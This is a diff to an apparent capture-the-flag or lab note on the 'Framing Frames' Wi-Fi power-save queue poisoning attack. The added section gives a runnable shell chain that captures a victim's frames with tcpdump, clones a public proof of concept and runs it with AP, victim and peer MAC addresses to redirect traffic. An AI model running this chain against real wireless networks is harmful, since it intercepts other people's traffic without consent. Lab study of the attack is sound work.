@@ -1,5 +1,7 @@
 # Framing Frames flag — power-save queue poisoning
 
+**Verified against:** scapy 2.5 as of 2026-Q3
+
 Vanhoef 2023. Frames destined for a sleeping victim can be poisoned
 in the AP's power-save queue and later delivered to a controlled peer
 when the victim wakes. The flag is what the victim was about to
@@ -44,6 +46,38 @@ run_sequence([
     {"action": "wait", "s": 20},
     {"action": "capture_stop"},
 ])
+```
+
+## MCP mapping / fallback
+
+None of `force_client_sleep`, `framing_frames_poison`, `capture_start`,
+or `capture_stop` exist in `src/`. All three primitives require a
+crafted 802.11 injection — use scapy on the Pineapple over SSH, then
+capture with tcpdump.
+
+**Fallback shell chain:**
+
+```bash
+# 1. Sit on the target's channel + start capture (replaces capture_start).
+sudo tcpdump -i wlan1mon -w /tmp/ff.pcapng \
+    "wlan addr1 11:22:33:44:55:66 or wlan addr2 11:22:33:44:55:66" &
+CAP_PID=$!
+
+# 2. force_client_sleep + framing_frames_poison — both require scapy
+#    injection of a spoofed Null-Data frame (PwrMgt=1) from the victim's
+#    MAC, followed by a spoofed unicast to a controlled peer. See
+#    Vanhoef's public PoC:  https://github.com/vanhoefm/framing-frames
+git clone https://github.com/vanhoefm/framing-frames /tmp/ff
+sudo python3 /tmp/ff/attack.py \
+    --iface wlan1mon \
+    --ap AA:BB:CC:DD:EE:FF \
+    --victim 11:22:33:44:55:66 \
+    --peer aa:aa:aa:aa:aa:aa
+
+# 3. Stop capture and inspect.
+sleep 20
+sudo kill "$CAP_PID"
+tshark -r /tmp/ff.pcapng -Y "wlan.da == aa:aa:aa:aa:aa:aa" -V | less
 ```
 
 ## The flag surface
